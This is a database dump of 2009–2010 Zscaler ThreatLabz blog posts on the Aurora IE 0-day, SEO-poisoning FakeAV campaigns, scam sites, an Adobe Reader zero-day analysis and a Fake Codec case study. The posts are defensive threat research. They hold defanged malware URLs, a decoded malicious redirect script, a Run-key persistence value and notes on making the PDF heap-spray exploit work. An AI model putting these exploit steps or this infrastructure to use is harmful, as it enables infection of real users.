INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (555, 'IE 0-Day On GOV.CN', 'ThreatLabz', 'January 25, 2010', 'A few days back, there was a post on a forum about malware warnings displayed when visiting: www[dot]latax[dot]gov[dot]cnTranslates:Upon analysis of the page, it appears that this GOV.CN page is hosting a page exploiting the Internet Explorer 0-day vulnerability (CVE-2010-0249). The same vulnerability exploited to compromise Google, Adobe, and other vendors in an attack dubbed \'Operation Aurora.\'Here is a snippet of the GOV.CN source, building the shellcode variable:There is a slight deviation to the way that the shellcode is constructed  (visible in above image) from some of the other variants that we have  seen.  Though, it uses the same exploit structure as past variants, including the ev1() and ev2() function names.The ev1() function is used to dereference the previously declared event object:and  attack the vulnerabilityusing the ev2() function to load the shellcode into memory and call the previously dereferenced object:The JavaScript loads the shellcode and exploits the vulnerability, which downloads the payload v.exe from the same GOV.CN domain.VirusTotal identifies 12/41 Anti-Virus engines detect the v.exe payload.  It is a variant of the Chinese based Hupigon Backdoor, which F-Secure lists some of its features as:   • It allows others to access the computer• Allows  for recording with the user\'s webcam• Can make the user\'s  computer to attack various servers• Send victim\'s  computer messages• Has rootkit functionality so it has a  stealth component that hides files• Create logs from  keystrokes, steals passwords, and sends this information to remote  servers The Hupigon malware kit is described as being \"maintained in a very professional fashion with a highly developed User Interface (UI).\"  Screenshot below:This is just one example of this IE 0-day impacting GOV.CN sites; I have seen a few other reports of this. While there are several other examples of malware being hosted on GOV.CN domains, for example,.wscz.gov.cn.zhepb.gov.cn.jssalt.gov.cn.xfgh.gov.cn .laspzx.linan.gov.cn.zsjs.nmfc.gov.cnThe question is: are these CN Government sponsored for the purposes of potentially spying on its citizens, or have GOV.CN websites been infiltrated by hackers?  In either case, browse safe, and if you are using IE 6, please upgrade or consider a different browser.', 'Zero Day', 'https://www.zscaler.com/blogs/research/ie-0-day-govcn');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (556, 'What We Can Learn From Google\'s China Attack', 'Michael Sutton', 'January 19, 2010', 'The Internet has been abuzz over Google\'s admission that it was targeted in a coordinated and allegedly state sponsored cyber attack. Some are applauding Google\'s stance, while others question Google’s true motivation. This story is too big to just disappear so I have no doubt that we\'ll learn more as time goes on, but let\'s consider what we should have learned thus far.         1.) Corporations make corporate decisions         It makes for a lovely feel good story to believe that Sergey Brin charged into Eric Schmidt\'s office to demand that Google exit China as retaliation for the attack. It\'s nice to believe that \"do no evil\" can survive in the corporate jungle. The reality is that Google is a large (very large) corporation and mottos other than \"do what\'s best for the shareholder\'s\" are little more than advertising hype. Sure Sergey and Larry own a big piece of the pie, but like all large corporations, Google is controlled by large, faceless institutional investors doing what they\'ve been tasked with - looking at the bottom line. Google didn\'t go public with this story to save the world. They did so because they believe that it\'s the right business decision and they\'ve decided that the benefits of doing business in China simply aren\'t worth the costs. They remain a long way from winning in China the way that they\'ve won in the rest of the world. They have decided that the cost of the negative public perception created when they agreed to censor search results simply hasn\'t been worth it, especially when they are also forced to deal with state sponsored infiltrations, possibly aided by insiders.         2.) Outdated Web Browsers Leave a Gaping Security Hole         Just because software hasn\'t reached end-of-life status isn\'t justification for using it. It has been a long standing gripe of mine that IE 6 continues to control significant market share in the enterprise. Any CISO that hasn\'t fought to change this should be fired. Yes, IE 7 & 8 are also allegedly vulnerable but public exploit code seen to date has not successfully exploited these versions of IE. Why? Because they have additional security measures that make this vulnerability harder to exploit. In this case, the protection making the difference is Data Execution Prevention (DEP) but additionally, they include a number of additional protections such as Address Space Layout Randomization (ASLR), malicious URL/phishing blacklists, XSS protection, etc. The answer is not to avoid IE altogether as Germany and France suggest, but at a minimum, enterprises must ensure that they are running the latest browsers, with the most current security protections.         3.) 0Day, Targeted Attacks are Very Hard to Defend Against         Perfect security lives on Pandora. We live on Earth. Don\'t waste time looking for it.         When an attacker possesses a weapon that you haven\'t seen before, you are at a significant disadvantage. 0day attacks present a fundamental challenge because we don\'t know what we\'re looking for. Combine that with a knowledgeable adversary that can effectively employ social engineering and no matter what security measures you have in place, at some point you will be compromised. Should we roll over and give up? Of course not. The goal is not perfect security but rather to mitigate threats to an acceptable level. We can achieve that by employing defense-in-depth and assuring that our detective controls are sufficient to understand the extent of damage, control it and quickly recover should a breach occur.         4.) The Best Defense is a Good Offense         One of the more surprising angles to this story has been the revelation that Google went on the offensive to get to the bottom of the attack. While such an approach can put an organization in a legal grey area, it is unlikely that Google would ever have had the evidence necessary to be confident of the origin of the attacks and the fact that some 33 other companies were affected had they not broken into a server in Taiwan. Did Google coordinate it\'s efforts with law enforcement? Is this a tipping point in the evolution of cyber warfare, when corporations frustrated with the red tape encountered by law enforcement crossing international borders begin to take matters into their own hands? Stay tuned...         - michael', 'Compromise', 'https://www.zscaler.com/blogs/research/what-we-can-learn-googles-china-attack');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (557, 'Haiti Earthquake Also Rocks Internet (Update)', 'ThreatLabz', 'January 14, 2010', 'Following my previous post, I had lots of questions about what we are seeing in terms of malware and fraud taking advantage of the Haiti earthquake.    Not surprisingly we have seen an increase of web transactions to charity / donation sites - including some domains that were registered immediately following the earthquake, for example, haitifoundation.com.      Web transactions to donations sites range from:      	The mainstream, for example, RedCross  	The more obscure, for example, a personal blog (haitirescuecenter.wordpress.com) of an alleged worker in Haiti.  	The suspicious, for example, haitipal.com that links you to a PayPal donation to the user haitipal{at}hotmail[dot]com.      While, such sites may have good intentions, users should be wary of any site soliciting PayPal donations as there\'s no way to vet the source and ensure that donations are going to the victims. Individuals looking to donate should stick to reputable organizations only. CNN has a list of known, vetted donation organizations for Haiti.    On the malware front, we are seeing an increase in search engine optimization (SEO) taking advantage of Haiti Earthquake search terms to redirect visitors to FakeAV malware.    Here is a small list of the FakeAV domains that we have seen recently being redirected from Haiti Earthquake SEOed sites:      	fullsecurityscanc.com  	scan-now23.com  	full-pc-scanner1.com  	best-systemguard.net  	full-pc-scanner22.com      Zscaler will continue to monitor and protect their customers against this campaign.', 'Scam', 'https://www.zscaler.com/blogs/research/haiti-earthquake-also-rocks-internet-update');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (558, 'Haiti Earthquake Also Rocks Internet', 'ThreatLabz', 'January 13, 2010', 'The magnitude 7.0 earthquake rocked Port-Au-Prince and its surrounding area on Tuesday, January 12, 2010 at 13:53:09 PST (21:53:09 UTC) according to USGS. Within the hour, the shock resonated on the Internet. The security community, including Zscaler, has been and continues to be vigilant (reference SANS ISC) for SEO attacks, fraudulent donation sites, and malicious web content taking advantage of the global popularity of folks following the story on the Internet. How quickly did this physical event transcend to cyber space and what was its impact on the Internet? Zscaler is in a unique position to provide an answer based on customer usage of the cloud.\r\n\r\nI pulled the numbers for unique URLs visited with the word ‘haiti’ in the URL string for January 11 PST and then for January 12 PST, and calculated the percentage increase in URLs visited and bandwidth used over these two 24 hour periods.\r\n\r\nThere was a 1578% increase in URLs visited with a corresponding 5407% increase in bandwidth usage for ‘haiti’ URLs. Where bandwidth includes the request and response bytes over the 24 hour period.\r\n\r\nHere is a graph of the ‘haiti’ URLs visited for each hour (PST) during January 12, showing an explosion in Internet activity covering this event.', 'Scam', 'https://www.zscaler.com/blogs/research/haiti-earthquake-also-rocks-internet');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (559, 'Malware Attacks On Winter Solstice - Shortest Day Of The Year 2009', 'ThreatLabz', 'December 22, 2009', 'Yesterday, December 21st 2009 was the Winter Solstice, meaning that it was the shortest day of the year. Malware authors did not miss this opportunity to push their malicious binaries using SEO (search-engine optimization) attacks. My colleague already posted a blog on SEO attacks where he mentioned that an SEO attack takes the advantage of Google\'s PageRank Technology to push search results to the top. We found several phrases/names like “Winter Solstice 2009 celebration” or “Shortest day of the year 2009” used in the search query resulted in a page redirecting to malicious sites containing malware. Here is the screenshot of search result,             Looking at the screenshot, you will find that the 3rd and 5th search results are malicious. Attackers use SEO as users are more likely to click on links which show up as top results. Clicking on the 3rd link uses redirection to direct victim to a malicious site hosting malware. Here is what a user will see,                  Redirection could take the victim to a variety of sites, all of which are hosting fake security applications. The malicious sites are using fake images, popups or even showing videos to social engineer the victim into downloading a malicious executable once they click on the page. Here are some few sites used for downloading the malware:    “hxxp://ftorm.com/scn/579876515334ef7a1587…[truncated]”    “hxxp://shjow.com/scn/3fe14f17847082bd940b…[truncated]”    “hxxp://prizepcscan.com/?p=p52dcWpsal%2FCj…[truncated]”    “hxxp://newscanonline.info/downloads.php/?aff_id=384…[truncated]”    Here are screenshots of the malicious sites:                       The above images are taken after clicking on the same search results multiple times, resulting in redirection to different attack sites and methods used for infection. Sometimes the victim will be presented with a video playing or popup images or messages urging the victim to install fake anti-virus software. The sites displaying videos will download a file named “Flash_Plugin_Setup1261476530.exe” to the system and other sites download “setup.exe” as a malicious file. Here are the virus total results for those files,    For “Flash_Plugin_Setup1261476530.exe”    http://www.virustotal.com/analisis/78f7246e0e6b9ae58bba1581727f2f598d330cfaf34c987f1bed665ee53429cb-1261476806    For “setup.exe”    http://www.virustotal.com/analisis/2f86f7bc9139dc4267ad1325c92f08557f5a359e6d74ccb6620248b99cf9a68e-1261476933    The “setup.exe” has very poor detection (4 out of 41). This is not the first time malware authors have used the latest hot news, celebrity’s names, holidays, popular event etc. They use such key phrases to push their malicious site to the top of the search results using SEO techniques. They continually change their malicious binaries in order to evade Anti-viruses from detection. The success of this approach is demonstrated in the above Virustotal results illustrating poor AV detection. Be sure to never download anything from redirected site promising free security software.    Be Safe,    Umesh', 'Malware', 'https://www.zscaler.com/blogs/research/malware-attacks-winter-solstice-shortest-day-year-2009');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (560, 'Beware Of SEO Attacks', 'ThreatLabz', 'December 21, 2009', 'On Sunday, Tom Stuker, a United Global Services member that flew about 700,000 miles this year, was interviewed on Fox News. Not long after that, the top Google search results for Tom Stuker were all poisoned to have links that take the victim to Fake AV malware downloads.    SEO (search-engine optimization) attacks, take advantage of Google\'s PageRank Technology to have their page result bubble to the top. Google\'s PageRank Technology is based on a web of trust, they rank pages that are linked to as being of higher importance and thus scored higher. However, using clever hypertext content for their page and an army of bots to spread links on forums, blogs, hacked websites, etc. hackers are able to grab the top spots for their search terms of choice.    Given the speed at which these search terms are poisoned, it is likely that the hackers may have bots monitoring popular media feeds for names / key-phrases that folks are likely to Google. This type of leveraging of the media as a decision-based feed for automation reminds me of the fictional book Daemon. Other members in the security industry have taken recent notice to these rapid SEO attacks as well: Brittany Murphy SEO and Beware of bad Google search results.    Following the redirects to get to the malware for one of the Tom Stuker examples seen yesterday:    hxxp://davtech.org/sqr.php?in=tom%20stuker  302s to: hxxp://hirm9k.xorg.pl?in.php?t=cc&d=20-12-2009_some2&h=davtech.org&p=http%3A%2F%www.google.com [snip...]  302s to: hxxp://newvirusscan.com/hitin.php?land=20&affid=92400  302s to: hxxp://newvirusscan.com/index.php?affid=92400    few js\'s load then the payload:  hxxp://newvirusscan.com/downloader.php?affid=92400  200 response: Content-Disposition: attachment; filename=\"install.exe\"    Interesting stuff in the 200 OK response from the server:  Pragma: hack    Uploaded sample to VirusTotal (first one seen for this sample) - poor detection (13/41): http://www.virustotal.com/analisis/af58ed98fdc57ed25eb59d7e21b28f9f270bae6a5a8ca789f97876641567800f-1261348933', 'Abuse', 'https://www.zscaler.com/blogs/research/beware-seo-attacks');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (561, '1 Week \'til XMAS... Avoid Shopping Woes', 'ThreatLabz', 'December 18, 2009', 'Many folks are familiar with fake goods sites (e.g., replica watches and fake pharm / pill sites). These sites either peddle shoddy goods, or just flat out steal your payment credentials.\r\n\r\nIn case you needed to be reminded this holiday season, there are more than the obvious scam sites out there. Many show up in search engine results / advertisements and forum / e-mail advertisements (spam). On top of which, many have been in business for more than this holiday season.\r\n\r\nSome examples,\r\nhxxp://www.cheap-abercrombie.com/\r\nhxxp://www.variantkicks.com/\r\nhxxp://www.tiffanyoutlet.com/\r\n\r\nYou can see by visiting the sites, that their virtual store-fronts look legit:\r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\nThe Name Records for each of these examples dates back to 2001, 2007, and 2008:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n			\r\n			\r\n		\r\n	\r\n\r\n\r\nThere are many more examples of these questionable virtual storefronts. However, I was able to find a single forum post spam advertising the above examples (which I why I selected these three):\r\n\r\nThis site states that cheap-abercrombie.com advertises that their merchandise is authentic, but customers are reporting the merchandise to be poorly made replicas with no option for return / refund.\r\n\r\nThis site states that variantkicks.com sells counterfeit shoes and charges $36 USD for returns.\r\n\r\nThe tiffanyoutlet.com site does not currently resolve an A record (but is also not showing that it is suspended by the Registrar). Google has a cached page of the site here, and Google results show that the site has been advertised via spam and is peddling fake jewelry.\r\n\r\nWhether you are buying your sweetie a tennis bracelet, a sweater, or some new kicks this holiday season, buy from reputable stores, do your research, and if you have any doubt about the legitimacy of a store, err on the side of caution and shop elsewhere. Onguardonline.gov has more advice for online shopping here.', 'Phishing', 'https://www.zscaler.com/blogs/research/1-week-til-xmas-avoid-shopping-woes');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (562, 'Don\'t Watch-familyguyonline.com', 'ThreatLabz', 'December 18, 2009', '... or at least be careful if you do.  Who doesn\'t like a good episode of Family Guy? Well even if you don\'t, that isn\'t the point of this post. There are dangers visiting and trusting sites that link to and embed content into their site without validating the content first. Malware advertisers have been leveraging pop culture content and stories to entice and social engineer their victims into downloading their malware - Michael Jackson\'s death themed malware is a prime example. This morning I came across some malicious redirector sites that look very much like (and may be) legit sites. None-the-less, when a visitor follows the embedded video link to view their favorite episodes of Family Guy or another show, they would receive an annoying dose of survey pages (i.e., sign me up for spam) and/or malware.    Here\'s a snippet of such sites for Family Guy:  watch-familyguyonline.com  www.watch-family-guy-online.com  www.watch-familyguy-online.com  watchfamilyguyonline.org    What appears to have happened here is that sites like these automatically embed links to megavideo.com or other external video sources that are tagged as being Family Guy (or other specific) episodes without validating them.    Following the redirects, I tracked these two examples to the following malware:  hxxp://watch-familyguyonline.com/testt/  hxxp://www.watch-family-guy-online.com/season-8/episode-9-business-guy/    The loaded megavideo.com content, eventually taking the path:           	Megaclick.com, e.g., hxxp://s.megaclick.com/ad.code?de=9e09c529-07435895-c974b103-73e05fb5-bd3a-4-a48c&tm=1261149695.21963&du=aHR0cDovL3d3dy55ZXpsaW5rLmNvbS9zdGF0cy5waHA%2fcD1tZWdhY2xpY2tnenVz%0a&api_var_rd_mode=popunder_html  	Yezlink.com, e.g., hxxp://www.yezlink.com/stats.php?p=megaclickgzus  	302 redirect to hxxp://www.gameztar.com/go.php?a=1839&l=112  	302 redirect to  hxxp://www.gameztar.com/startDownload.do?a=1839&l=112  	Download: hxxp://download.gameztar.com/toolbar/gameztar/download/avatar/2.1.102.r6380/000011_oSz/gameztar_installer.exe        The MD5 of the sample is: c5b8e34abfb067ddc5f294cb057f86a0  With VirusTotal results (9/41): http://www.virustotal.com/analisis/a4b092a2b60a07aa6127314e5fbf37642272ad725569ed008df108fe43fd524b-1261147802    Update:  While writing this post, it appears that the first video has already been removed by megavideo (for infringement violation).', 'Malware', 'https://www.zscaler.com/blogs/research/dont-watch-familyguyonlinecom');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (563, 'New Zero Day Adobe Acrobat Reader Vulnerability Analysis – Part 2', 'ThreatLabz', 'December 16, 2009', 'Earlier, in the first blog of this series we talked about a malicious PDF file and extracted the malicious script. Now, we have a malicious script in readable format and want to know if this successfully runs or not. I am not going to run the original malicious file for now. I will replace the original shellcode with a simple one which will open a “calc.exe” after successful exploitation. The problem is the original malicious PDF file is in encoded format so we can’t edit the malicious script inside the file. For that I will create a new test PDF file using “make-pdf-javascript.py” tool from PDF Tools. This tool will create a simple PDF file containing JavaScript which will display a message box once opened. I am going to add malicious JavaScript code inside this file using command,    D:\\make-pdf-javascript.py --javascriptfile=Malicious_Script.js test.pdf    I am going to use another shellcode which will open “calc.exe”. Here is the newly created PDF file:            Let’s open it and see if this exploit works. This time it only crashed and did not opened a “calc.exe”. But I got a chance to look into the debugger. Here is the state of the ollydbg debugger,            The EDX currently points to zero and it is trying to CALL DWORD from [EDX +4]. Since it is zero, it has an access violation exception. Further we found that the module is “C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\plug_ins\\Multimedia.api”. Let’s change some EDX values manually in the debugger to see if this is going to work or not? Since we have already filled a heap we need to change values accordingly. I found our NOP sled and shellcode gets loaded at “0A0A0A0A” address, so this is the value we are going to use. Here is the state of ollydbg once I modify the values,            Now, EDX points to “0x0A0A0A0A” address and [EDX + 4] contains address “0x0A0A0A20” which is our NOP sled. So once I press “F9” (run) button in Ollydbg, it will jump to “0A0A0A20” address and will execute everything from there on. You can see this step by step during debugging. Yes, it has executed the NOP sled and our shellcode and “calc.exe” opened on the machine. But this was done by changing the values manually. It looks like there is problem with memory corruption. I played a little bit with the code and found that we have to add one more line of the vulnerable function before try{} block. Here is how new modified code will look,            Once I run this file again, the shellcode executed successfully and it showed a classic POP up box with error message and opened “calc.exe”,                 From above, it is clear that there is memory free issue with the vulnerable method “util.printd()”. It required calling this method twice with the try {} block. The code gets executed successfully and opened a calculator. This means if we now remove the “calc.exe” shellcode and use the original shellcode, then it is going to execute in the background without any notice. I am not going into more details of the original shellcode this time due to length of the blog post.    That is it for this series.    Umesh', 'Zero Day', 'https://www.zscaler.com/blogs/research/new-zero-day-adobe-acrobat-reader-vulnerability-analysis-part-2');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (564, 'New Zero Day Adobe Acrobat Reader Vulnerability Analysis – Part 1', 'ThreatLabz', 'December 16, 2009', 'On December 14th, Symantec and Shadowserver reported a new zero day vulnerability in the wild affecting Adobe reader. This is now identified as CVE-2009-4324. Adobe acknowledged the same on their website saying they are investigating this issue. And as usual, it is not the first time that PDF’s are being targeted for exploitation. Earlier we saw that Flash files are being targeted, taking advantage of known vulnerability in the wild. This time it is an Adobe zero day vulnerability being exploited in the wild. A colleague provided me with a sample PDF file exploiting this vulnerability in the wild. I started looking into it in depth. The PDF file was obfuscated and not in the readable format. I used my favorite “pdf-parser.py” from PDF Tools. I ran the malicious PDF file through this parser and took the output of every element of PDF file in a text file. Here is how it looks:              The output file was very big and I wanted to the malicious script code inside it. As I said earlier, the file was obfuscated and contains a lot of objects/elements inside. I was only interested in the some strings like JavaScript, FlateDecode, etc. I tried to search for these blocks inside the output file and I found some of interest:                  The above screenshots show some of the interesting blocks and which were used to uncover the malicious code inside. The “pdf-parser.py” tool has some very good options to parse the certain objects inside the file. I looked at the documentation of the tool and some of the options looked valuable to me. Here are some options and documentation directly copied from PDF Tools site.    “Filter option applies the filter(s) to the stream. For the moment, only FlateDecode is supported (e.g. zlib decompression). The raw option makes pdf-parser output raw data (e.g. not the printable Python representation). Objects outputs the data of the indirect object which ID was specified. This ID is not version dependent. If more than one object have the same ID (disregarding the version), all these objects will be outputted.”    This is what we need for running against suspicious blocks or objects inside PDF file. I then ran a command against this object tag ID 110 using command like,    D:\\ >pdf-parser.py --object=110 --raw –filter malicious-file.pdf > output.log    The command run successfully and I was interested to see if we get any interesting data in the output file. I opened the file and found very suspicious and obfuscated JavaScript code:             Now, from this it was easy to work. I opened Malzilla (malware hunting) tool and copied above script into decoder section of the tool. I ran the ‘Run Script’ button and found another script but it was in readable format. Here how it looked:             Let’s copy this and put it in a text file so that we can able to see whole script. This is a screenshot of full script used in the PDF file,             If you look at the strings and code above, it is clearly a heap spray code and this code relates to adobe reader. It is checking the version of application and if the application viewer version is greater than 8 then only it will exploit the vulnerability. This identifies that it is targeting latest Adobe reader. There is also one JavaScript function called “util.printd()”, one try{}-catch{} block and this looks the culprit. This function returns a date using a specified format according to documentation on Adobe. If you look at the parameters passed to this function, it is invalid and contains @ and some long numbers. This is likely the vulnerable method causing memory corruption in Adobe reader.    This is the first blog on the series and I will provide more information in the second blog of this series. The second blog will cover if the exploit is successful or not and how it can be leveraged further. I mentioned earlier in the Flash blog series as well that new zero day vulnerabilities continue to be discovered in the wild affecting popular applications like Adobe. The solution to this will be to disable JavaScript withing Acrobat Reader, described by the Shadowserver team, as Adobe does not have patch yet.    That’s it for now. Happy hunting!!!    Umesh', 'Zero Day', 'https://www.zscaler.com/blogs/research/new-zero-day-adobe-acrobat-reader-vulnerability-analysis-part-1');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (565, '2010 Security Predictions', 'Michael Sutton', 'December 15, 2009', '2009 was the year that we learned the meaning of the word recession and looked to the cloud for answers. Budgets were slashed and security departments were forced to do more with less, all while cybercrime rates rose as frustrated individuals used whatever means necessary to earn in a difficult economic climate. What 2010 will bring remains unclear but as we approach the New Year, optimism is beginning to emerge.    On the technology front, the ‘cloud honeymoon’ is over and now the hard work begins. Mobile is as exciting as ever with new platforms and functionality emerging with vendors battling for dominance. Social networking winners have been established, but we’re just beginning to see their true potential. Much remains to be seen but one thing is for sure – attackers are following these trends just as closely as the enterprises and consumers that benefit from them. That which becomes popular today, will be the attack vector of choice tomorrow. Below are our security predictions for the New Year.    1.) Apple is forced to climb the security learning curve    Apple has for some time been considered to have a safer operating system in OS X as it is less often targeted by attackers. While that may be true, it is less secure overall and Apple\'s increasing market share will force them to finally invest in security due to increasing attacks targeted at Apple devices.    2.) App Store Party Crashers    App stores are all the rage, with every mobile vendor racing to replicate Apple\'s success. Generally, vendors stand guard and only let in the applications that they feel are appropriate. Consumers mistakenly believe that this ensures that only secure applications can be obtained but that is not the case. Security testing is limited at best with app developers already having success slipping in apps with undocumented APIs. Attackers will take things one step further and slip malicious apps in under the gatekeeper\'s watch.    3.) Web based worms go prime time     We\'ve been teased with a variety of web based worms from Samy to StalkDaily. Most have been experiments as opposed to planned attacks with the goal of financial gain. That\'s about to change.    4.) The emergence of the web platform    We\'ve gone from web sites to web applications and we\'re now seeing the birth of the web platform. Social Networking sites such as Facebook have gone beyond delivering dynamic applications welcoming user-supplied content. They have now evolved into platforms inviting user-supplied functionality, allowing virtually anyone to develop unique applications within their ecosystem. Attacker will take advantage of this to deploy malicious applications on social networks and the sites will struggle to identify and block them before deployment.    5.) Attackers turn to the cloud    The cloud offers unprecedented storage and processing power at an attractive price. Think that\'s only attractive to enterprises? Think again.    6.) The arrival of financial DDoS attacks    Cloud based services generally charge based on actual consumption. This provides attackers with incentive to hold enterprises hostage by artificially inflating costs. Unfortunately, cloud providers have little incentive to stop this practice.    7.) Poking holes in the cloud    My greatest hope for 2010 is that marketing departments will give the term \'cloud computing\' a well-deserved break. 2009 saw great interest in the development of cloud computing architectures and one must wonder how often security was sacrificed in order to get to market quickly. Expect attackers to devote time to poking holes in the APIs of cloud providers. When they\'re found, thanks to multi-tenant architectures, it will have been worth the effort.    8.) Clickjacking comes out of hibernation    Clickjacking roared onto the scene in the summer of 2008 when Jeremiah Grossman and Robert Hansen had their OWASP talk delayed at the request of Adobe. The sensational web cam/microphone hack that drew media attention has been addressed, but the overall flaw still remains. Clckjacking can be a valuable tool in a social engineering attack and we’ve just begun to see it leveraged in attacks.    9.) Browser vendors finally start to take XSS seriously    I was very encouraged when Microsoft released IE 8 this year and it included cross-site scripting (XSS) protection. For all of the heat that Microsoft takes for security vulnerabilities, they continue to be a leader when it comes to adding innovative security features and this was another example. I’m confident that other browser vendors have taken notice and will fall in line.    10.) Past Data Breaches will look like child\'s play    This is by far the easiest prediction to make. We’ve all been amazed by the staggering numbers of compromised accounts in the CardSystems, Heartland and TJX data breaches, but prepare to be blown away once again. After all, records were made to be broken. As memory becomes cheaper and power becomes more expensive, enterprises are looking to consolidate data storage and continue to build massive data centers and develop ever larger data stores thanks to cloud computing. The volume of data that can be stolen when adequate security controls are not implemented will be truly staggering.', 'Analysis', 'https://www.zscaler.com/blogs/research/2010-security-predictions');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (566, 'Case Study: Fake Codec Leveraging LastFM', 'ThreatLabz', 'December 14, 2009', 'The Fake Codec / Fake Anti-Virus malware campaign, historically led by the Russian Business Network (RBN), has been going on for some time (here\'s a blog post dating back to 2006). Dancho Danchev\'s blog often details this campaign as well. While the campaign hasn\'t changed that drastically from its inception, I thought I\'d provide an overview of a case seen this morning to highlight its current state.    This morning\'s case used a LastFM user profile to advertise a Britney Spears sex tape:  hxxp://www.last.fm/user/BritneySpears33    LastFM is not the only victim of having malware campaigns advertised through their social networking interface (other examples where Fake Codec / AV malware has been advertised include other popular social sites: LinkedIn, Hi5, Digg, Scribd, and yes Facebook).    Here are a few more examples of these advertisements seen in LastFM (be careful if you follow these links): example 1, example 2, and example 3.    The Shoutbox portion provides a link to kick-off the \"fun-filled\" viewing for the unsuspecting victim ...    The link directs the would-be victim to: hxxp://bigtubeforyou.com/mirolim-video/5.html  which presents the browser with the obfuscated Javascript:    which decodes to:  var1=71;var2=var1;  if(var1==var2) document.location=\"hxxp://evamendesochka.com/go.php?sid=<num>\";    The \"sid\" parameter allows the client to cycle through a round-robin of 302 redirects to Fake Code / AV malware sites including:    hxxp://showmelovetube.cn/tube.htm  hxxp://door-ringer.cn/?pid=116&sid=299a9c  hxxp://tinytubetv.com/xplaymovie.php?id=45233    With malware downloads to:    hxxp://tubefreewatch.cn/1/install_plugin.exe  hxxp://windows-antivirus2.com/download/Inst_116.exe  hxxp://clearcristalmedia.com/flash-HQ-plugin.45233.exe    Some of the A records for the above used domains:  bigtubeforyou.com. 3600 IN A 66.36.248.253  evamendesochka.com. 2123 IN A 66.36.231.29  showmelovetube.cn. 2145 IN A 66.36.248.253  tubefreewatch.cn. 3600 IN A 66.36.248.253    NS records for the above used domains include:  ns1.kimmusha.com. 172513 IN A 66.36.231.29  ns1.evamendesochka.com. 172800 IN A 66.36.231.29    Taking a look at the 66.36.0.0/19 rwhois for this hopone.net block shows that the two IP addresses used in this campaign are specifically swipt out for the \"sls-db4p12\" network name, \"svservers\" organization:      The sls-db4p12 network name identifies the IPs as being part of superb.net network. The organization, svservers has been identified (again, dating back to 2006) in the past involved in supporting spamming / hacking operations. SvServers is a Russian dedicated hosting service:      These redirect / malware domains will be updated by the malware provider as they are discovered and blocked (e.g., by Google / browser alerts). One out of the above three was in my browser\'s alerts at the time of writing this up. Fortunately for reputation-based schemes, such as Zscaler\'s Page Risk Indexing, these IPs and certainly the SvServers infrastructure will be in use a bit longer by the malware provider.    The malware samples have very poor detection:    Inst_116.exe  MD5: c0d2017be29e5383b1a680ef59ed22e0  VirusTotal (5/41): http://www.virustotal.com/analisis/d1a052f117f1e0e4f828c04b7cabd8428cde6b9fc11f61e6e2f3d63ec01f9152-1260842320    flash-HQ-plugin.45233.exe  MD5: 2d683959e8864707f8f9808c404cd315  VirusTotal (8/41): http://www.virustotal.com/analisis/439d13cdefff86ed15051920114d10d2b190d08c1620245b15c6e56f1c8958e1-1260844620    and the most interesting for last:    install_plugin.exe  MD5: cbc1760ac498065235fea17f35eb254b  VirusTotal (0/41): http://www.virustotal.com/analisis/387b9195ab821bdc32c8e2523e1137de67305100b992df0d4393198adae292ae-1260817839    F-Prot identified the binary as being packed by NSIS. NSIS is the Nullsoft Scriptable Install System, which states the following capabilities:    The latest release was recent: NSIS 2.46 on December 6, 2009.    7-Zip advertises on their homepage to be able to unpack NSIS. Running the file through 7-Zip, the following file was extracted the from the NSIS file:  cryptwm97.dll  MD5: 2a823c8d471c5b7ee394e8bd2d0087f4  VirusTotal (0/41): http://www.virustotal.com/analisis/327939a7910aa4747302c66ba6f4b6f8eea8cd08a4e3065682a711149c3f318e-1260820248    The DLL is 73728 bytes and imports and leverages functionality from the Windows DLLs:  gdi32.dll, kernel32.dll, ole32.dll, shell32.dll, shlwapi.dll, user32.dll    And exports the functions:  DllInit and DllInstall    Running the install_plugin.exe through a sandbox, a file with the same MD5 as cryptwm97.dll was created on the infected system at the location:    %AppData%\\atmsyssound\\atmsyssound.dll    Where, %AppData% is a variable that refers to the file system directory that serves as a common repository for application-specific data. A typical path is C:\\Documents and Settings\\[UserName]\\Application Data.    The malware also modified the registry key:  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  with value  atmsyssound = \"rundll32.exe \"%AppData%\\atmsyssound\\atmsyssound.dll\", DllInit\"  so that atmsyssound.dll runs its initialization function DllInit every time Windows starts.    No network traffic was observed after infection. There is an identifiable string in the binary, (beyond the function calls from imported Windows DLLs): dvyllawnx.dll. Googling for atmsyssound.dll, cryptwm97.dll, and dvyllawnx.dll revealed no results. While the exact functionality of the binary is currently unknown, odds are that it is an information stealer of some kind or backdoor similar to Zlob (which has been the typical payload of these Fake Codec attacks). I plan to conduct further analysis on the payload and will share in a future blog post if it is interesting.    Some lessons from this:      	Social network sites allow users (including malicious users) to post / advertise content (including malicious content).  	While browser alerts and anti-virus products are good tools, they are not very effective by themselves.  	The Fake Codec / AV campaign is still alive and well after all these years, and these and other malware campaigns will continue to adapt to social networking advertisements and difficult to detect / analyze payloads.', 'Malware', 'https://www.zscaler.com/blogs/research/case-study-fake-codec-leveraging-lastfm');
